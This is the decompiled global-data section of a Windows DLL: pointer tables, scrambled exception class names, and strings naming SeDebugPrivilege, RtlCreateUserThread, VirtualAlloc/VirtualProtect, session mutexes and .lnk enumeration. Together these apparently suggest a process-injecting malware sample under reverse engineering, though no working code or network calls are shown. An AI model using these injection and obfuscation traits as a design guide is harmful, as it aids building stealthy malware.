int (__thiscall *off_1007498C)(void *Block, char) = &sub_1002C282; // weak
int (__thiscall *off_100749C4)(void *Block, char) = &sub_1002B45B; // weak
int (__thiscall *off_100749FC)(void *Block, char) = &sub_1002B47A; // weak
int (__thiscall *off_10074A1C)(void *Block, char) = &sub_1002B8E7; // weak
int (__thiscall *off_10074A3C)(void *Block, char) = &sub_1002B927; // weak
int (__thiscall *off_10074A5C)(void *Block, char) = &sub_1002B946; // weak
int (__thiscall *off_10074A7C[2])(void *Block, char) = { &sub_1002C6AA, &sub_1002C607 }; // weak
int (__thiscall *off_10074A80)(void *Block, char) = &sub_1002C607; // weak
int (__thiscall *off_10074A88)(void *Block, char) = &sub_1002CABB; // weak
int (__thiscall *off_10074A90)(void *Block, char) = &sub_1002CBE6; // weak
int (__thiscall *off_10074A98[2])(void *Block, char) = { &sub_1002CF72, &sub_1002D2A2 }; // weak
int (__thiscall *off_10074A9C)(void *Block, char) = &sub_1002D2A2; // weak
int (__stdcall *off_10074AA0)(char) = &sub_1002D5B1; // weak
_UNKNOWN unk_10074AA8; // weak
_UNKNOWN unk_10074AB0; // weak
int (__thiscall *off_10074AB8)(void *Block, char) = &sub_1002D878; // weak
int (__thiscall *off_10074AC0)(void *Block, char) = &sub_1002D8BB; // weak
int (__thiscall *off_10074AC8)(void *Block, char) = &sub_1002D8FE; // weak
int (__thiscall *off_10074AD0)(void *Block, char) = &sub_1002D948; // weak
int (__thiscall *off_10074ADC)(void *Block, char) = &sub_1002D98F; // weak
void (__noreturn *off_10074AE0)() = &_purecall; // weak
int (__stdcall *off_10074AE4)(char) = &sub_1002E15F; // weak
_UNKNOWN unk_10074AEC; // weak
int (*off_10074AF4)() = &sub_10031252; // weak
int (__stdcall *off_10074AF8)(char) = &sub_1002E13D; // weak
_UNKNOWN unk_10074B00; // weak
_UNKNOWN unk_10074B08; // weak
int (__thiscall *off_10074B10)(void *Block, char) = &sub_1002DA3E; // weak
int (__thiscall *off_10074B18)(void *Block, char) = &sub_1002E433; // weak
int (__thiscall *off_10074B20[3])(void *Block, char) = { &sub_1002E6F9, &sub_1002E8C1, &sub_1002EB40 }; // weak
int (__thiscall *off_10074B24[2])(void *Block, char) = { &sub_1002E8C1, &sub_1002EB40 }; // weak
int (__thiscall *off_10074B28)(void *Block, char) = &sub_1002EB40; // weak
void (__noreturn *off_10074B6C)() = &_purecall; // weak
int (__thiscall *off_10074B80)(void *Block, char) = &sub_1002ECCA; // weak
int (__thiscall *off_10074B94[2])(void *Block, char) = { &sub_1002EF3F, &sub_1002F007 }; // weak
int (__thiscall *off_10074B98)(void *Block, char) = &sub_1002F007; // weak
int (__thiscall *off_10074BA0)(void *Block, char) = &sub_1002F321; // weak
int (__thiscall *off_10074C04)(void *Block, char) = &sub_1002FA7D; // weak
int (__thiscall *off_10074C38)(void *Block, char) = &sub_1002FB69; // weak
int (__thiscall *off_10074C70)(void *Block, char) = &sub_1002FC94; // weak
int (__thiscall *off_10074CC8[2])(void *Block, char) = { &sub_1002FF35, &sub_1003024E }; // weak
int (__thiscall *off_10074CCC)(void *Block, char) = &sub_1003024E; // weak
int (__thiscall *off_10074CE0)(void *Block, char) = &sub_10030C9E; // weak
int (__thiscall *off_10074D04)(void *Block, char) = &sub_1003071B; // weak
int (__thiscall *off_10074D30[2])(void *Block, char) = { &sub_10030879, &sub_1003073A }; // weak
int (__thiscall *off_10074D34)(void *Block, char) = &sub_1003073A; // weak
int (__thiscall *off_10074D54)(void *Block, char) = &sub_10030C7F; // weak
int (__thiscall *off_10074D8C)(void *Block, char) = &sub_10030859; // weak
int (__thiscall *off_10074DAC)(void *Block, char) = &sub_10030EBA; // weak
int (__thiscall *off_10074DB4)(void *Block, char) = &sub_10030FF3; // weak
int (__thiscall *off_10074DD8)(void *Block, char) = &sub_100310A3; // weak
int (__thiscall *off_10074DE0)(void *Block, char) = &sub_10031114; // weak
int (__thiscall *off_10074DE8)(void *Block, char) = &sub_100315C3; // weak
__int16 word_10074DEC[] = { 15581 }; // weak
int (__thiscall *off_10074DFC)(void *Block, char) = &sub_100337C3; // weak
int (__thiscall *off_10074E30)(void *Block, char) = &sub_1003398D; // weak
int (__thiscall *off_10074E54)(void *Block, char) = &sub_10034109; // weak
int (__thiscall *off_10074E78)(void *Block, char) = &sub_100341E1; // weak
_UNKNOWN unk_100752FC; // weak
const _ThrowInfo _TI2_AVConhnutmnzqpnNwGcoNhnutmNzqpnnwgc_rzciu__ = { 0u, &sub_10001060, NULL, &_CTA2_AVConhnutmnzqpnNwGcoNhnutmNzqpnnwgc_rzciu__ }; // idb
const _ThrowInfo _TI2_AVTyxCkOnhqdgZuatyxcko_sr__ = { 0u, &sub_1000E188, NULL, &_CTA2_AVTyxCkOnhqdgZuatyxcko_sr__ }; // idb
const _ThrowInfo _TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__ = { 0u, &sub_10002DBC, NULL, &_CTA2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__ }; // idb
const _ThrowInfo _TI2_AVLahgnutrUrbccmcrf_sr__ = { 0u, &sub_1000DF88, NULL, &_CTA2_AVLahgnutrUrbccmcrf_sr__ }; // idb
const _ThrowInfo _TI1_AVSnsziibtx_sr__ = { 0u, &sub_1000DF1A, NULL, &_CTA1_AVSnsziibtx_sr__ }; // idb
const _ThrowInfo _TI2_AVDkpOsublklbcJnkmkirtg_sr__ = { 0u, &sub_10007D13, NULL, &_CTA2_AVDkpOsublklbcJnkmkirtg_sr__ }; // idb
const _ThrowInfo _TI2_AVScdeiYyksupovo_sr__ = { 0u, &sub_10009355, NULL, &_CTA2_AVScdeiYyksupovo_sr__ }; // idb
const _ThrowInfo _TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__ = { 0u, &sub_1000CBCE, NULL, &_CTA3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__ }; // idb
const _ThrowInfo _TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__ = { 0u, &sub_1000EAAE, NULL, &_CTA3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__ }; // idb
const _ThrowInfo _TI2_AVHfpmmmiamaHpnxxaqhf_sr__ = { 0u, &sub_1000E136, NULL, &_CTA2_AVHfpmmmiamaHpnxxaqhf_sr__ }; // idb
const _ThrowInfo _TI2_AVVkleVkdoghmczMqygvklev_vwfp_qlp_pqesih_sr__ =
{
  0u,
  &sub_1001202D,
  NULL,
  &_CTA2_AVVkleVkdoghmczMqygvklev_vwfp_qlp_pqesih_sr__
}; // idb
const _ThrowInfo _TI2_AVKugkdNnUifqbYgkugkdnn_sr__ = { 0u, &sub_1000E24E, NULL, &_CTA2_AVKugkdNnUifqbYgkugkdnn_sr__ }; // idb
const _ThrowInfo _TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__ = { 0u, &sub_1002C563, NULL, &_CTA2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__ }; // idb
const _ThrowInfo _TI2_AVBtedofbPwtdhdgkk_bjxssd_sr__ = { 0u, &sub_1002C5B5, NULL, &_CTA2_AVBtedofbPwtdhdgkk_bjxssd_sr__ }; // idb
const _ThrowInfo _TI2_AVDehafrYfplitlVwgdehAfryfplit_gfjjefwq_sr__ = { 0u, &sub_1002CCA9, NULL, &_CTA2_AVDehafrYfplitlVwgdehAfryfplit_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__ = { 0u, &sub_1002CC57, NULL, &_CTA2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI2_AVVJVzywhgyue_sr__ = { 0u, &sub_1000CD28, NULL, &_CTA2_AVVJVzywhgyue_sr__ }; // idb
const _ThrowInfo _TI2_AVGfnpwoMadjdwvkl_sr__ = { 0u, &sub_1000E0BF, NULL, &_CTA2_AVGfnpwoMadjdwvkl_sr__ }; // idb
const _ThrowInfo _TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__ = { 0u, &sub_10017404, NULL, &_CTA5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__ }; // idb
__TI_flags _TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__ = 0; // weak
const _ThrowInfo _TI4_AVQdlyUQBeskfuooz_jhzi_sr__ = { 0u, &sub_10017561, NULL, &_CTA4_AVQdlyUQBeskfuooz_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVCsszWkelsgXqduhacss_jhzi_sr__ = { 0u, &sub_100186CD, NULL, &_CTA5_AVCsszWkelsgXqduhacss_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__ = { 0u, &sub_1001889C, NULL, &_CTA5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__ }; // idb
const _ThrowInfo _TI2_AVBpqonlefcdQdwemTtnqbpqon_kzwdu_sr__ = { 0u, &sub_1002D91D, NULL, &_CTA2_AVBpqonlefcdQdwemTtnqbpqon_kzwdu_sr__ }; // idb
const _ThrowInfo _TI2_AVRnaLirybajtn_sr__ = { 0u, &sub_1000E2C5, NULL, &_CTA2_AVRnaLirybajtn_sr__ }; // idb
__TI_flags _TI5_AVHzsnwtmRbderjskb_jhzi_sr__ = 0; // weak
const _ThrowInfo _TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__ = { 0u, &sub_1002E215, NULL, &_CTA2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__ }; // idb
const _ThrowInfo _TI2_AVUwwroNiqrrorTaapnauww_yq_sr__ = { 0u, &sub_1001BF2B, NULL, &_CTA2_AVUwwroNiqrrorTaapnauww_yq_sr__ }; // idb
const _ThrowInfo _TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__ = { 0u, &sub_1002E52A, NULL, &_CTA3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__ = { 0u, &sub_1002E4D9, NULL, &_CTA3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__ = { 0u, &sub_1002E488, NULL, &_CTA2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__ }; // idb
__TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__ = 0; // weak
const _ThrowInfo _TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__ = { 0u, &sub_1002E5CC, NULL, &_CTA3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__ = { 0u, &sub_1002E61D, NULL, &_CTA3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVXsbqaAtiqgxcIvskflXaxsbqaat_qsbdzsml_sr__ = { 0u, &sub_1002E57B, NULL, &_CTA3_AVXsbqaAtiqgxcIvskflXaxsbqaat_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI2_AVEtKqstreari_gfjjefwq_sr__ = { 0u, &sub_1002CB94, NULL, &_CTA2_AVEtKqstreari_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI3_AVUPQaqbVhsrnozqr_jhzi_sr__ = { 0u, &sub_10020DD7, NULL, &_CTA3_AVUPQaqbVhsrnozqr_jhzi_sr__ }; // idb
const _ThrowInfo _TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__ = { 0u, &sub_10024691, NULL, &_CTA4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__ }; // idb
const _ThrowInfo _TI4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__ =
{
  0u,
  &sub_1002522A,
  NULL,
  &_CTA4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__
}; // idb
const _ThrowInfo _TI2_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__ = { 0u, &sub_10029CC4, NULL, &_CTA2_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__ = { 0u, &sub_1002A4BF, NULL, &_CTA1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__ }; // idb
__TI_flags _TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__ = 0; // weak
const _ThrowInfo _TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__ = { 0u, &sub_1002E025, NULL, &_CTA4_AVAoubmBglPnbiMzvxptraa_cah_sr__ }; // idb
const _ThrowInfo _TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__ = { 0u, &sub_1002CC05, NULL, &_CTA2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__ }; // idb
int dword_1008D0C4 = -1; // weak
int dword_1008D3D8 = -1153374642; // weak
void *off_1008DBD0 = &unk_10095860; // weak
int dword_1008DF88 = 28800; // weak
int dword_1008DF8C = 1; // weak
int dword_1008DF90 = -3600; // weak
void *off_1008E018 = &unk_1008DF98; // weak
_UNKNOWN unk_1008E0E0; // weak
char byte_1008E11A = '\0'; // weak
int dword_1008E11C = 0; // weak
_UNKNOWN unk_1008E120; // weak
_UNKNOWN unk_1008E178; // weak
wchar_t word_1008E1BC = 0u; // idb
wchar_t word_1008E1C0 = 0u; // idb
wchar_t word_1008E1C4 = 0u; // idb
wchar_t word_1008E1C8 = 0u; // idb
wchar_t word_1008E1CC = 0u; // idb
wchar_t word_1008E1D0 = 0u; // idb
_UNKNOWN unk_1008E1D4; // weak
wchar_t aNtdllDll_5[] = L"ntdll.dll"; // idb
_UNKNOWN unk_1008E224; // weak
_UNKNOWN unk_1008E258; // weak
_UNKNOWN unk_1008E2B0; // weak
wchar_t word_1008E2DC = 0u; // idb
wchar_t word_1008E2E4 = 0u; // idb
_UNKNOWN unk_1008E2EA; // weak
_UNKNOWN unk_1008E2EB; // weak
wchar_t word_1008E2EC = 0u; // idb
_UNKNOWN unk_1008E2EE; // weak
_UNKNOWN unk_1008E2EF; // weak
wchar_t word_1008E2F0 = 0u; // idb
_UNKNOWN unk_1008E2F2; // weak
wchar_t aLnk[] = L"lnk"; // idb
wchar_t asc_1008E314[] = L"\\*.*"; // idb
wchar_t asc_1008E32C[] = L"\\"; // idb
_UNKNOWN unk_1008E37F; // weak
_UNKNOWN unk_1008E389; // weak
_UNKNOWN unk_1008E38A; // weak
_UNKNOWN unk_1008E38B; // weak
_UNKNOWN unk_1008E395; // weak
_UNKNOWN unk_1008E3AE; // weak
_UNKNOWN unk_1008E3AF; // weak
_UNKNOWN unk_1008E3B9; // weak
_UNKNOWN unk_1008E3BA; // weak
_UNKNOWN unk_1008E3BB; // weak
_UNKNOWN unk_1008E4E0; // weak
_UNKNOWN unk_1008E528; // weak
_UNKNOWN unk_1008E578; // weak
wchar_t word_1008E5C4 = 0u; // idb
wchar_t word_1008E5C8 = 0u; // idb
wchar_t word_1008E5CC = 0u; // idb
_UNKNOWN unk_1008E5D0; // weak
_UNKNOWN unk_1008E610; // weak
_UNKNOWN unk_1008E668; // weak
_UNKNOWN unk_1008E6B0; // weak
_UNKNOWN unk_1008E6F4; // weak
_UNKNOWN unk_1008E728; // weak
_UNKNOWN unk_1008E768; // weak
_UNKNOWN unk_1008E7A8; // weak
_UNKNOWN unk_1008E7D8; // weak
_UNKNOWN unk_1008E810; // weak
wchar_t word_1008E84C = 0u; // idb
wchar_t asc_1008E858[] = L"."; // idb
wchar_t word_1008E85C = 0u; // idb
wchar_t word_1008E860 = 0u; // idb
_UNKNOWN unk_1008E86C; // weak
wchar_t asc_1008E89C[] = L"\\"; // idb
CHAR aNtdllDll_2[] = "ntdll.dll"; // idb
wchar_t aRtlexpandenvir[] = L"RtlExpandEnvironmentStrings_U"; // idb
wchar_t aRtlinitunicode[] = L"RtlInitUnicodeString"; // idb
wchar_t aNtdllDll_1[] = L"ntdll.dll"; // idb
_UNKNOWN unk_1008E928; // weak
_UNKNOWN unk_1008E9C0; // weak
_UNKNOWN unk_1008E9FB; // weak
_UNKNOWN unk_1008E9FC; // weak
_UNKNOWN unk_1008EA1B; // weak
_UNKNOWN unk_1008EA1C; // weak
_UNKNOWN unk_1008EA46; // weak
_UNKNOWN unk_1008EA47; // weak
wchar_t aKernel32Dll_0[] = L"kernel32.dll"; // idb
_UNKNOWN unk_1008EA62; // weak
char byte_1008EA63 = '\x01'; // weak
wchar_t aVirtualfree_1[] = L"VirtualFree"; // idb
wchar_t aGetprocaddress_0[] = L"GetProcAddress"; // idb
wchar_t aGetmodulehandl_1[] = L"GetModuleHandleA"; // idb
wchar_t aOpenthread[] = L"OpenThread"; // idb
wchar_t aExitthread[] = L"ExitThread"; // idb
wchar_t aKernel32Dll_5[] = L"kernel32.dll"; // idb
wchar_t aVirtualfree_2[] = L"VirtualFree"; // idb
wchar_t aExitthread_0[] = L"ExitThread"; // idb
_UNKNOWN unk_1008EB3B; // weak
wchar_t aNtdllDll_3[] = L"ntdll.dll"; // idb
_UNKNOWN unk_1008EB50; // weak
_UNKNOWN unk_1008EBAA; // weak
_UNKNOWN unk_1008EBAB; // weak
char String[] = "SeDebugPrivilege"; // idb
_UNKNOWN unk_1008EBBD; // weak
_UNKNOWN unk_1008EBBE; // weak
_UNKNOWN unk_1008EBC0; // weak
wchar_t word_1008EC0C = 0u; // idb
wchar_t aThPoolShdPqomg[] = L"TH_POOL_SHD_PQOMGMN_%dSYNCMTX"; // idb
wchar_t word_1008EC4C = 0u; // idb
wchar_t aThPoolShdMtxGm[] = L"TH_POOL_SHD_MTX_GMN94XQ_%d"; // idb
wchar_t aRtlcreateusert[] = L"RtlCreateUserThread"; // idb
wchar_t aNtdllDll_4[] = L"ntdll.dll"; // idb
wchar_t aGetmodulehandl_0[] = L"GetModuleHandleW"; // idb
_UNKNOWN unk_1008ECE8; // weak
_UNKNOWN unk_1008ED14; // weak
_UNKNOWN unk_1008ED44; // weak
_UNKNOWN unk_1008ED74; // weak
_UNKNOWN unk_1008EDA4; // weak
_UNKNOWN unk_1008EDD4; // weak
_UNKNOWN unk_1008EE04; // weak
WCHAR Class = 0u; // idb
wchar_t word_1008EE38 = 0u; // idb
wchar_t word_1008EE3C = 0u; // idb
wchar_t word_1008EE40 = 0u; // idb
wchar_t word_1008EE44 = 0u; // idb
wchar_t word_1008EE48 = 0u; // idb
_UNKNOWN unk_1008EE57; // weak
_UNKNOWN unk_1008EE5A; // weak
_UNKNOWN unk_1008EE5B; // weak
_UNKNOWN unk_1008EE5E; // weak
_UNKNOWN unk_1008EE5F; // weak
wchar_t word_1008EF04 = 0u; // idb
wchar_t asc_1008EF08[] = L"%X"; // idb
_UNKNOWN unk_1008EF10; // weak
wchar_t asc_1008EF68[] = L"\""; // idb
wchar_t asc_1008EF6C[] = L"\""; // idb
wchar_t asc_1008EF70[] = L" "; // idb
WCHAR StringSecurityDescriptor[] = L"S:(ML;;NW;;;LW)"; // idb
_UNKNOWN unk_1008EF94; // weak
_UNKNOWN unk_1008EFD0; // weak
_UNKNOWN unk_1008F018; // weak
WCHAR aKernel32Dll_1[] = L"kernel32.dll"; // idb
_UNKNOWN unk_1008F088; // weak
_UNKNOWN unk_1008F0C8; // weak
_UNKNOWN unk_1008F110; // weak
CHAR sz[] = "ExitThread"; // idb
_UNKNOWN unk_1008F170; // weak
CHAR aUnmapviewoffil[] = "UnmapViewOfFile"; // idb
CHAR aVirtualfree[] = "VirtualFree"; // idb
wchar_t word_1008F1D8 = 0u; // idb
wchar_t aUpdtSyncMtxTme[] = L"UPDT_SYNC_MTX_TME_ON_OFF_%d_%d"; // idb
WCHAR aKernel32Dll_2[] = L"kernel32.dll"; // idb
WCHAR aNtdllDll_0[] = L"ntdll.dll"; // idb
CHAR aVirtualalloc[] = "VirtualAlloc"; // idb
CHAR aSleep[] = "Sleep"; // idb
CHAR aVirtualfree_0[] = "VirtualFree"; // idb
CHAR aVirtualprotect[] = "VirtualProtect"; // idb
CHAR aLoadlibrarya[] = "LoadLibraryA"; // idb
CHAR aGetprocaddress[] = "GetProcAddress"; // idb
CHAR aGetmodulehandl[] = "GetModuleHandleA"; // idb
CHAR aMemcpy[] = "memcpy"; // idb
CHAR aMemset[] = "memset"; // idb
CHAR aFreelibrary[] = "FreeLibrary"; // idb
CHAR aOpenmutexw[] = "OpenMutexW"; // idb
CHAR aCreatefilemapp[] = "CreateFileMappingW"; // idb
CHAR aMapviewoffile[] = "MapViewOfFile"; // idb
CHAR aUnmapviewoffil_0[] = "UnmapViewOfFile"; // idb
CHAR aCreatemutexw[] = "CreateMutexW"; // idb
CHAR aWaitforsingleo[] = "WaitForSingleObject"; // idb
CHAR aClosehandle[] = "CloseHandle"; // idb
CHAR aNtqueryinforma[] = "NtQueryInformationProcess"; // idb
CHAR aGetlasterror[] = "GetLastError"; // idb
CHAR aReleasemutex[] = "ReleaseMutex"; // idb
CHAR aOpenfilemappin[] = "OpenFileMappingW"; // idb
_UNKNOWN unk_1008F38E; // weak
_UNKNOWN unk_1008F38F; // weak
CHAR aLoadlibraryw[] = "LoadLibraryW"; // idb
_UNKNOWN unk_1008F39D; // weak
_UNKNOWN unk_1008F39E; // weak
_UNKNOWN unk_1008F39F; // weak
CHAR aCreatefilew[] = "CreateFileW"; // idb
CHAR aLocalfree[] = "LocalFree"; // idb
WCHAR pszFmt[] = L"Session\\%d\\TH_POOL_SHD_MTX_FSW95XQ_TEST"; // idb
WCHAR String2[] = L"Global"; // idb
WCHAR aSessionD[] = L"Session\\%d"; // idb
WCHAR aSThPoolShdMtxF[] = L"%s\\TH_POOL_SHD_MTX_FSW95XQ_%d"; // idb
WCHAR asc_1008F46C[] = L"\\"; // idb
WCHAR aSThPoolShdPqoi[] = L"%s\\TH_POOL_SHD_PQOISNG_%dSYNCMTX"; // idb
WCHAR aMsvcrtDll[] = L"msvcrt.dll"; // idb
CHAR aAdvapi32Dll_0[] = "advapi32.dll"; // idb
CHAR aConvertstrings_1[] = "ConvertStringSecurityDescriptorToSecurityDescriptorW"; // idb
WCHAR aShell32Dll[] = L"shell32.dll"; // idb
wchar_t word_1008F52C = 0u; // idb
wchar_t word_1008F530 = 0u; // idb
_UNKNOWN unk_1008F538; // weak
_UNKNOWN unk_1008F5A0; // weak
_UNKNOWN unk_1008F61C; // weak
wchar_t word_1008F654 = 0u; // idb
wchar_t word_1008F658 = 0u; // idb
wchar_t word_1008F65C = 0u; // idb
int dword_1008F660 = 0; // weak
int dword_1008F664 = 0; // weak
int dword_1008F668 = 0; // weak
WCHAR ModuleName[] = L"kernel32.dll"; // idb
CHAR ProcName[] = "GetProductInfo"; // idb
_UNKNOWN unk_1008F6E0; // weak
wchar_t aNtdllDll[] = L"ntdll.dll"; // idb
_UNKNOWN unk_1008F74C; // weak
_UNKNOWN unk_1008F784; // weak
_UNKNOWN unk_1008F7BC; // weak
_UNKNOWN unk_1008F7F4; // weak
_UNKNOWN unk_1008F834; // weak
_UNKNOWN unk_1008F870; // weak
wchar_t word_1008F8A8 = 0u; // idb
wchar_t a08x[] = L"%08X"; // idb
wchar_t word_1008F8B8 = 0u; // idb
wchar_t aD[] = L"%d"; // idb
wchar_t word_1008F8C4 = 0u; // idb
_UNKNOWN unk_1008F8C8; // weak
wchar_t word_1008F928 = 0u; // idb
_UNKNOWN unk_1008F930; // weak
_UNKNOWN unk_1008F978; // weak
_UNKNOWN unk_1008F9C0; // weak
_UNKNOWN unk_1008FA10; // weak
_UNKNOWN unk_1008FA50; // weak
wchar_t word_1008FA6C = 0u; // idb
wchar_t word_1008FA70 = 0u; // idb
_UNKNOWN unk_1008FA88; // weak
wchar_t word_1008FAC8 = 0u; // idb
wchar_t word_1008FACC = 0u; // idb
wchar_t word_1008FAD0 = 0u; // idb
_UNKNOWN unk_1008FAD8; // weak
_UNKNOWN unk_1008FB08; // weak
wchar_t word_1008FB38 = 0u; // idb
_UNKNOWN unk_1008FB40; // weak
_UNKNOWN unk_1008FB70; // weak
int dword_1008FBB4 = 0; // weak
_UNKNOWN unk_1008FBB8; // weak
wchar_t word_1008FC14 = 0u; // idb
_UNKNOWN unk_1008FC18; // weak
_UNKNOWN unk_1008FC60; // weak
_UNKNOWN unk_1008FCA8; // weak
_UNKNOWN unk_1008FCF8; // weak
wchar_t word_1008FD3C = 0u; // idb
_UNKNOWN unk_1008FD40; // weak
_UNKNOWN unk_1008FD88; // weak
_UNKNOWN unk_1008FDD0; // weak
_UNKNOWN unk_1008FE20; // weak
_UNKNOWN unk_1008FE68; // weak
_UNKNOWN unk_1008FED0; // weak
_UNKNOWN unk_1008FF08; // weak
_UNKNOWN unk_1008FF68; // weak
_UNKNOWN unk_1008FFC0; // weak
_UNKNOWN unk_10090000; // weak
_UNKNOWN unk_10090050; // weak
_UNKNOWN unk_10090088; // weak
_UNKNOWN unk_100900C4; // weak
_UNKNOWN unk_10090104; // weak
_UNKNOWN unk_10090140; // weak
_UNKNOWN unk_10090180; // weak
_UNKNOWN unk_100901E4; // weak
_UNKNOWN unk_10090220; // weak
_UNKNOWN unk_10090270; // weak
_UNKNOWN unk_100902BC; // weak
_UNKNOWN unk_10090300; // weak
_UNKNOWN unk_10090340; // weak
_UNKNOWN unk_1009037C; // weak
_UNKNOWN unk_100903B8; // weak
_UNKNOWN unk_100903F4; // weak
_UNKNOWN unk_10090430; // weak
_UNKNOWN unk_10090474; // weak
_UNKNOWN unk_100904B4; // weak
_UNKNOWN unk_100904F0; // weak
_UNKNOWN unk_10090530; // weak
_UNKNOWN unk_1009056C; // weak
_UNKNOWN unk_100905A8; // weak
_UNKNOWN unk_100905E8; // weak
_UNKNOWN unk_10090620; // weak
_UNKNOWN unk_10090660; // weak
_UNKNOWN unk_100906A0; // weak
_UNKNOWN unk_100906F0; // weak
_UNKNOWN unk_10090730; // weak
_UNKNOWN unk_10090774; // weak
_UNKNOWN unk_100907B0; // weak
_UNKNOWN unk_100907FC; // weak
_UNKNOWN unk_1009083C; // weak
_UNKNOWN unk_10090878; // weak
_UNKNOWN unk_100908BC; // weak
_UNKNOWN unk_100908F8; // weak
_UNKNOWN unk_1009093C; // weak
_UNKNOWN unk_10090980; // weak
_UNKNOWN unk_100909C8; // weak
_UNKNOWN unk_10090A10; // weak
_UNKNOWN unk_10090A50; // weak
_UNKNOWN unk_10090A88; // weak
_UNKNOWN unk_10090AC8; // weak
_UNKNOWN unk_10090B04; // weak
_UNKNOWN unk_10090B40; // weak
_UNKNOWN unk_10090B94; // weak
_UNKNOWN unk_10090BD8; // weak
_UNKNOWN unk_10090C24; // weak
_UNKNOWN unk_10090C5C; // weak
_UNKNOWN unk_10090C98; // weak
_UNKNOWN unk_10090CDC; // weak
_UNKNOWN unk_10090D1C; // weak
_UNKNOWN unk_10090D54; // weak
_UNKNOWN unk_10090D94; // weak
_UNKNOWN unk_10090DD0; // weak
_UNKNOWN unk_10090E10; // weak
_UNKNOWN unk_10090E4C; // weak
_UNKNOWN unk_10090E88; // weak
_UNKNOWN unk_10090EC4; // weak
_UNKNOWN unk_10090EFC; // weak
_UNKNOWN unk_10090F38; // weak
_UNKNOWN unk_10090F70; // weak
_UNKNOWN unk_10090FAC; // weak
_UNKNOWN unk_10090FE8; // weak
_UNKNOWN unk_10091028; // weak
_UNKNOWN unk_10091068; // weak
_UNKNOWN unk_100910A8; // weak
_UNKNOWN unk_100910E8; // weak
_UNKNOWN unk_10091124; // weak
_UNKNOWN unk_10091160; // weak
_UNKNOWN unk_100911A0; // weak
_UNKNOWN unk_100911DC; // weak
_UNKNOWN unk_10091218; // weak
_UNKNOWN unk_10091264; // weak
_UNKNOWN unk_100912A0; // weak
_UNKNOWN unk_100912E0; // weak
_UNKNOWN unk_10091320; // weak
_UNKNOWN unk_1009135C; // weak
_UNKNOWN unk_10091398; // weak
_UNKNOWN unk_100913E0; // weak
_UNKNOWN unk_10091418; // weak
_UNKNOWN unk_10091458; // weak
_UNKNOWN unk_10091494; // weak
_UNKNOWN unk_100914D4; // weak
_UNKNOWN unk_10091510; // weak
_UNKNOWN unk_10091550; // weak
_UNKNOWN unk_10091590; // weak
_UNKNOWN unk_100915D0; // weak
_UNKNOWN unk_1009160C; // weak
_UNKNOWN unk_10091648; // weak
_UNKNOWN unk_10091680; // weak
_UNKNOWN unk_100916C0; // weak
wchar_t word_10091724 = 0u; // idb
wchar_t word_10091728 = 0u; // idb
_UNKNOWN unk_10091730; // weak
_UNKNOWN unk_10091790; // weak
_UNKNOWN unk_100917F0; // weak
_UNKNOWN unk_10091854; // weak
_UNKNOWN unk_10091888; // weak
wchar_t word_100918E4 = 0u; // idb
_UNKNOWN unk_100918E8; // weak
_UNKNOWN unk_10091950; // weak
_UNKNOWN unk_10091990; // weak
_UNKNOWN unk_100919E0; // weak
_UNKNOWN unk_10091A28; // weak
_UNKNOWN unk_10091A78; // weak
_UNKNOWN unk_10091AC0; // weak
LPCSTR lpszDesktop = NULL; // idb
char *dword_10091AFC = NULL; // idb
char *dword_10091B00 = NULL; // idb
int dword_10091B04 = 0; // weak
LPVOID Environment = NULL; // idb
wchar_t word_10091B88 = 0u; // idb
int dword_10091C08 = 0; // weak
int dword_10091D5C = 0; // weak
int dword_10091DBC = 0; // weak
